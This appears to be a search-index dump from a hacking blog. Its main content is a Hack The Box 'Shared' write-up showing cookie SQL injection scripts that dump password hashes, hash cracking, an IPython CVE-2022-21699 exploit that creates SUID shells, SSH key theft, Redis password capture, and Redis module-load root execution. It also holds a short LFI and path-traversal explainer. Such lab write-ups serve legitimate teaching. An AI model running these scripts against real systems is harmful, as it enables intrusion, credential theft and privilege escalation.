payload\n{\u0026#34;CRAAFTKP\u0026#39;#\u0026#34;:\u0026#34;1\u0026#34;} {:.nolineno}\nThe response to the first payload suggests that SQL injection is possible but we can make sure by sending a payload that should evaluate to false, and one that should be true.\n#!/usr/bin/env python3 from urllib.parse import quote from sys import argv if len(argv) == 2: sqli = argv[1] sqli = sqli.replace(\u0026#39;\\\\\u0026#39;, \u0026#39;\\\\\\\\\u0026#39;) sqli = sqli.replace(\u0026#39;\u0026#34;\u0026#39;,\u0026#39;\\\\\u0026#34;\u0026#39;) print(quote(\u0026#39;{\u0026#34;\u0026#39; + argv[1] + \u0026#39;\u0026#34;:\u0026#34;1\u0026#34;}\u0026#39;)) {:file=\u0026ldquo;makepayload.py\u0026rdquo;}\nchmod +x makepayload.py true=$(./makepayload.py \u0026#34;\u0026#39; OR 1=1#\u0026#34;) # Always resolves to true false=$(./makepayload.py \u0026#34;\u0026#39; AND 1=2#\u0026#34;) # Always resolves to false url=\u0026#34;https://checkout.shared.htb\u0026#34; curl -k -s $url -b \u0026#34;custom_cart=$true\u0026#34; | sed \u0026#39;s/^ *//\u0026#39; \u0026gt; true.html curl -k -s $url -b \u0026#34;custom_cart=$false\u0026#34; | sed \u0026#39;s/^ *//\u0026#39; \u0026gt; false.html {:.nolineno}\nThis should leave you with two files called false.html{:.filepath} and true.html{:.filepath}. To find the difference between the two response bodies we can use diff.\ndiff false.html true.html {:.nolineno}\n37,39c37,39 \u0026lt; \u0026lt;td\u0026gt;Not Found\u0026lt;/td\u0026gt; \u0026lt; \u0026lt;td\u0026gt;0\u0026lt;/td\u0026gt; \u0026lt; \u0026lt;td\u0026gt;$0,00\u0026lt;/td\u0026gt; --- \u0026gt; \u0026lt;td\u0026gt;53GG2EF8\u0026lt;/td\u0026gt; \u0026gt; \u0026lt;td\u0026gt;1\u0026lt;/td\u0026gt; \u0026gt; \u0026lt;td\u0026gt;$23,90\u0026lt;/td\u0026gt; 45c45 \u0026lt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;$0,00\u0026lt;/th\u0026gt; --- \u0026gt; \u0026lt;th scope=\u0026#34;col\u0026#34;\u0026gt;$23,90\u0026lt;/th\u0026gt; {:.nolineno}\nThe false query returns \u0026ldquo;Not Found\u0026rdquo; and zero values for the quantity and price while the true query returns a product entry. This is definitely enough evidence of an SQL injection vulnerability to begin exploitation.\nWeb Exploitation # We have already determined that boolean-based blind SQL injection is possible with the true and false queries, but there is a good chance we can use UNION SELECT queries to exfiltrate database values without having to use a side-channel.\nUnion Query Exfiltration # Let\u0026rsquo;s first find the number of columns in the original query so we can match it in our UNION SELECT extension.\npayload=$(./makepayload.py \u0026#34;\u0026#39; UNION SELECT \u0026#39;c0lumn1\u0026#39;,\u0026#39;c0lumn2\u0026#39;,\u0026#39;c0lumn3\u0026#39;#\u0026#34;) curl -k -s \u0026#34;https://checkout.shared.htb\u0026#34; -b \u0026#34;custom_cart=$payload\u0026#34; | \\ sed \u0026#39;s/^ *//\u0026#39; | egrep \u0026#39;\u0026lt;/?td\u0026gt;\u0026#39; {:.nolineno}\n\u0026lt;td\u0026gt;c0lumn2\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;1\u0026lt;/td\u0026gt; \u0026lt;td\u0026gt;$\u0026lt;/td\u0026gt; {:.nolineno}\nNotice how the response contains the value we sent in the second column. This means we can extract data through the second column. Now let\u0026rsquo;s create a script to get any raw value from the database.\n#!/bin/bash [ -z \u0026#34;$SELECT\u0026#34; ] \u0026amp;\u0026amp; echo \u0026#34;SELECT=* FROM=* WHERE=* $0\u0026#34; \u0026amp;\u0026amp; exit payload=\u0026#34;\u0026#39; UNION SELECT \u0026#39;\u0026#39;,$SELECT,\u0026#39;\u0026#39;\u0026#34; [ -z \u0026#34;$FROM\u0026#34; ] || payload=\u0026#34;$payload FROM $FROM\u0026#34; [ -z \u0026#34;$WHERE\u0026#34; ] || payload=\u0026#34;$payload WHERE $WHERE\u0026#34; echo $payload payload=$(./makepayload.py \u0026#34;$payload#\u0026#34;) curl -k -s \u0026#34;https://checkout.shared.htb\u0026#34; -b \u0026#34;custom_cart=$payload\u0026#34; | egrep \u0026#39;\u0026lt;/?td\u0026gt;\u0026#39; | head -1 | sed -E \u0026#39;s/^ *\u0026lt;td\u0026gt;(.*)\u0026lt;\\/td\u0026gt;$/\\1/\u0026#39; {:file=\u0026ldquo;sqli.sh\u0026rdquo;}\nThen we can see if we can get the available database names. Remember that this database is probably MySQL because the # comment is working.\nchmod +x sqli.sh SELECT=\u0026#34;group_concat(schema_name)\u0026#34; \\ FROM=\u0026#34;information_schema.schemata\u0026#34; \\ ./sqli.sh {:.nolineno}\ninformation_schema,checkout {:.nolineno}\nThere is a database called checkout that we should explore. Let\u0026rsquo;s find the names of its tables.\nSELECT=\u0026#34;group_concat(table_name)\u0026#34; \\ FROM=\u0026#34;information_schema.tables\u0026#34; \\ WHERE=\u0026#34;table_schema=\u0026#39;checkout\u0026#39;\u0026#34; \\ ./sqli.sh {:.nolineno}\nuser,product {:.nolineno}\nThe user table seems interesting. Let\u0026rsquo;s find the column names and dump the table contents.\nSELECT=\u0026#34;group_concat(column_name)\u0026#34; \\ FROM=\u0026#34;information_schema.columns\u0026#34; \\ WHERE=\u0026#34;table_name=\u0026#39;user\u0026#39;\u0026#34; \\ ./sqli.sh {:.nolineno}\nid,username,password {:.nolineno}\nSELECT=\u0026#34;group_concat(concat(id,0x7c,username,0x7c,password))\u0026#34; \\ FROM=\u0026#34;checkout.user\u0026#34; \\ ./sqli.sh {:.nolineno}\n1|james_mason|[REDACTED] {:.nolineno}\nThere is only one result, but we got what looks like an MD5 hash in the password column for the user james_mason.\nShell as james_mason # Let\u0026rsquo;s try to crack the hash using John the Ripper\n# mhil4ne@kali hash=\u0026#34;\u0026#34; # Hash here echo \u0026#34;james_mason:$hash\u0026#34; \u0026gt; md5.john john md5.john \\ --format=\u0026#34;raw-md5\u0026#34; \\ --wordlist=\u0026#34;rockyou.txt\u0026#34; # classic rockyou.txt wordlist {:.nolineno}\nUsing these credentials on the target\u0026rsquo;s SSH server will land us a shell as james_mason.\n# mhil4ne@kali ssh \u0026#34;james_mason@$rhost\u0026#34; {:.nolineno}\nThere is no user flag in our home directory so we might need to do some lateral movement.\nLateral Movement # We will be using LinPEAS from PEASS-ng to look for any useful information on the machine. We will also be using pspy to snoop on processes.\n# mhil4ne@kali lhost=\u0026#34;10.10.14.10\u0026#34; # Listener host cd $(mktemp -d) wget \\ \u0026#34;https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64\u0026#34; \\ \u0026#34;https://github.com/carlospolop/PEASS-ng/releases/download/20220522/linpeas.sh\u0026#34; php -S $lhost:80 {:.nolineno}\n# james_mason@shared.htb (SSH) lhost=\u0026#34;10.10.14.10\u0026#34; # Attacker\u0026#39;s IP address mkdir .sneak \u0026amp;\u0026amp; cd .sneak wget \u0026#34;http://$lhost/pspy64\u0026#34; \u0026#34;http://$lhost/linpeas.sh\u0026#34; bash ./linpeas.sh | tee linpeas.log {:.nolineno}\nWe don\u0026rsquo;t get anything that blatantly stands out in the LinPEAS output. Let\u0026rsquo;s try running PSpy for a few minutes.\n# james_mason@shared.htb (SSH) chmod +x pspy64 timeout 3m ./pspy64 | tee pspy.log {:.nolineno}\nLooking at the output, user ID 0 and user ID 1001 seem to be running routine commands. UID 0 is root and User ID 1001 turns out to be user dan_smith, declared in /etc/passwd{:.filepath}. It can be noted that dan_smith runs an interesting command every minute.\n/bin/sh -c /usr/bin/pkill ipython; cd /opt/scripts_review/ \u0026amp;\u0026amp; /usr/local/bin/ipython {:.nolineno}\nThe user enters the /opt/scripts_review{:.filepath} directory and executes /usr/local/bin/ipython{:.filepath}.\nCVE-2022-21699 # After doing some research into ipython, we come across a vulnerability advisory that details a code execution flaw.\nWe’d like to disclose an arbitrary code execution vulnerability in IPython that stems from IPython executing untrusted files in CWD. This vulnerability allows one user to run code as another.\nLet\u0026rsquo;s check if the version on the machine is vulnerable.\n# james_mason@shared.htb (SSH) /usr/local/bin/ipython --version {:.nolineno}\nThe version is 8.0.0, which is vulnerable. Since the routine command executed by dan_smith is run in the /opt/scripts_review{:.filepath} directory, we could exploit the vulnerability if /opt/scripts_review{:.filepath} is writable.\n# james_mason@shared.htb (SSH) ls -la /opt/scripts_review {:.nolineno}\nIt is writable by those in the developer group. According to the output of the id command, our current user is actually part of this group.\nExploitation # Let\u0026rsquo;s test our hypothesis by following the instructions in the advisory to execute code as dan_smith.\n#!/bin/bash exploitdir=\u0026#34;/opt/scripts_review\u0026#34; cmd=\u0026#34;cp /bin/sh /tmp/dan_smith_sh;chmod a+xs /tmp/dan_smith_sh\u0026#34; mkdir -m 777 \u0026#34;$exploitdir/profile_default\u0026#34; mkdir -m 777 \u0026#34;$exploitdir/profile_default/startup\u0026#34; echo \u0026#34;__import__(\u0026#39;os\u0026#39;).popen(\u0026#39;$cmd\u0026#39;)\u0026#34; \u0026gt; \u0026#34;$exploitdir/profile_default/startup/x.py\u0026#34; {:file=\u0026ldquo;exploit.sh\u0026rdquo;}\nAfter running the script and waiting a minute, our SUID shell should be at /tmp/dan_smith_sh{:.filepath}.\n# james_mason@shared.htb (SSH) /tmp/dan_smith_sh -p {:.nolineno}\nPrivilege Escalation # The first flag is located at /home/dan_smith/user.txt{:.filepath}\nStabilizing Shell # Let\u0026rsquo;s copy the contents of /home/dan_smith/.ssh/id_rsa{:.filepath} over to the attacker machine and use it to log in as dan_smith via SSH to get a more stable shell.\n# mhil4ne@kali chmod 600 dan_smith_id_rsa ssh -i dan_smith_id_rsa \u0026#34;dan_smith@$rhost\u0026#34; {:.nolineno}\nEnumeration # When running the id command, we learn that our current user is part of the sysadmin group. Let\u0026rsquo;s see what this group has special access to.\n# dan_smith@shared.htb (SSH) find / -group sysadmin 2\u0026gt;/dev/null {:.nolineno}\n/usr/local/bin/redis_connector_dev One file at /usr/local/bin/redis_connector_dev{:.filepath} is returned. This file probably has something to do with a key-value data storage solution known as Redis. When we execute /usr/local/bin/redis_connector_dev{:.filepath}, it prints a log message saying \u0026ldquo;Logging to redis instance using password\u0026rdquo; and what looks like the output of the INFO Server redis query.\nRedis # Let\u0026rsquo;s gather some basic info on the file and see what\u0026rsquo;s going on behind the scenes.\n# dan_smith@shared.htb (SSH) file /usr/local/bin/redis_connector_dev|tr \u0026#39;,\u0026#39; \u0026#39;\\n\u0026#39; {:.nolineno}\nBased on the output of the file command, we can note a few things about the file:\nIt is an ELF x86-64 executable It was built with a Go compiler (hence the Go BuildID) It is not stripped Finding the Password # Since the Redis RESP protocol operates in plaintext, we might be able to capture the password. First, let\u0026rsquo;s copy the file to the attacker machine.\n# mhil4ne@kali scp -i dan_smith_id_rsa \u0026#34;dan_smith@$rhost:/usr/local/bin/redis_connector_dev\u0026#34; . chmod +x redis_connector_dev {:.nolineno}\nRunning the file on the attacker machine, we get an error complaining that TCP port 6379 is closed on the loopback address. We can open that port by running nc in a separate tab.\n# mhil4ne@kali nc -lv 127.0.0.1 6379 {:.nolineno}\nNow if we run ./redis_connector_dev{:.filepath} we get some output to the listener.\nConnection received on localhost 35468 *2 $4 auth $16 [REDACTED] {:.nolineno}\nThe strings auth and [REDACTED] are passed. Given the circumstances, the second string seems like it may be the password so let\u0026rsquo;s try using that with the redis-cli command back on the target machine.\n# dan_smith@shared.htb (SSH) redis-cli -a \u0026#34;$password\u0026#34; INFO server {:.nolineno}\nThe INFO server command is successfully executed. While running some extra enumeration commands we find out that the redis store is pretty much empty.\n# dan_smith@shared.htb (SSH) redis-cli -a \u0026#34;$password\u0026#34; INFO keyspace {:.nolineno}\nAfter some research on redis, we come across this page which presents different methods of achieving RCE on a redis server. This is useful for us because the user running the redis server is root meaning we will execute commands as root if RCE is possible.\nLoading Modules # One method is to load a special shared object file using MODULE LOAD query. We can build the shared object from this source code on the attacker machine, then copy module.so{:.filepath} to the target.\n# james_mason@shared.htb (SSH) command=\u0026#34;cp /bin/sh /root_sh;chmod a+xs /root_sh\u0026#34; redis-cli -a \u0026#34;$password\u0026#34; MODULE LOAD ~/module.so \u0026amp;\u0026amp; redis-cli -a \u0026#34;$password\u0026#34; system.exec \u0026#34;$command\u0026#34; /root_sh -p {:.nolineno}\nRunning this should land us a shell as root where the last flag can be found at /root/root.txt{:.filepath}\n","date":"27 March 2024","externalUrl":null,"permalink":"/writeups/shared/","section":"WriteUps","summary":"Resolucion de Maquina Shared","title":"Shared Writeup","type":"writeups"},{"content":" Founder # Jose Milane (Aka. Mhil4ne) Hello! I\u0026rsquo;m Jose Milane, the founder of Rift Hacking, a passionate cybersecurity enthusiast aged 20. My aim is to share the knowledge I acquire.\nTeam # Roland Alvarado (Aka. b0ySie7e) eJPT - eWPT\nAn enthusiast of hacking and cybersecurity sharing knowledge and learnings with passion.\n","date":"27 March 2024","externalUrl":null,"permalink":"/team/","section":"Rift Hacking","summary":"Founder # Jose Milane (Aka.","title":"Team","type":"page"},{"content":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed. In this guide, we\u0026rsquo;ll delve into the advanced aspects of LFI and Path Traversal, exploring real-world examples and learning how to effectively mitigate these risks.\nUnderstanding Local File Inclusion (LFI) and Path Traversal: # Local File Inclusion (LFI) is a vulnerability that allows an attacker to include files from the server\u0026rsquo;s file system. Path Traversal, on the other hand, involves manipulating file paths to access files outside the web root directory. These vulnerabilities can be exploited to disclose sensitive information, execute arbitrary code, or even compromise the entire system.\nExploring Advanced LFI and Path Traversal Techniques: # Directory Traversal Attack: In this scenario, the attacker manipulates input parameters to traverse directories and access files outside the web root directory. For example, by appending \u0026ldquo;../\u0026rdquo; to a file path, the attacker can navigate to parent directories and access sensitive files.\nNull Byte Injection: Null byte injection exploits the use of null terminators in file paths to bypass security measures. By appending a null byte (%00) to the end of a file path, the attacker can truncate the path and access files that would otherwise be restricted.\nDouble Encoding: Double encoding involves encoding special characters multiple times to bypass input validation mechanisms. For instance, the attacker may encode \u0026ldquo;../\u0026rdquo; as \u0026ldquo;%252e%252e%252f\u0026rdquo; to bypass filters and execute a directory traversal attack.\nReal-World Examples: # Consider a web application vulnerable to LFI and Path Traversal. The attacker could exploit these vulnerabilities to access sensitive configuration files, such as \u0026ldquo;/etc/passwd\u0026rdquo; or \u0026ldquo;/etc/shadow\u0026rdquo;, leading to unauthorized access to user credentials.\nMitigating LFI and Path Traversal: # To mitigate LFI and Path Traversal vulnerabilities, it\u0026rsquo;s essential to implement robust input validation and access controls:\nSanitize user input to prevent directory traversal attacks. Implement proper file path validation to restrict access to authorized directories. Use secure coding practices, such as parameterized queries and output encoding, to prevent injection attacks. Regularly update and patch web servers and applications to address known vulnerabilities. ##Conclusion: Local File Inclusion (LFI) and Path Traversal are serious security risks that require careful attention and mitigation strategies. By understanding the advanced techniques used by attackers and implementing effective security measures, organizations can protect their web applications and prevent unauthorized access to sensitive data. Stay vigilant, stay informed, and stay secure in the ever-evolving landscape of web security.\n","date":"26 January 2023","externalUrl":null,"permalink":"/posts/lfi/","section":"Post","summary":"Local File Inclusion (LFI) and Path Traversal are critical vulnerabilities in web applications that can lead to severe security breaches if left unaddressed.","title":"Local File Inclusion","type":"posts"},{"content":"","date":"26 January 2023","externalUrl":null,"permalink":"/tags/web/","section":"Tags","summary":"","title":"Web","type":"tags"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/categories/","section":"Categories","summary":"","title":"Categories","type":"categories"},{"content":"","date":"1 January 0001","externalUrl":null,"permalink":"/series/","section":"Series","summary":"","title":"Series","type":"series"}]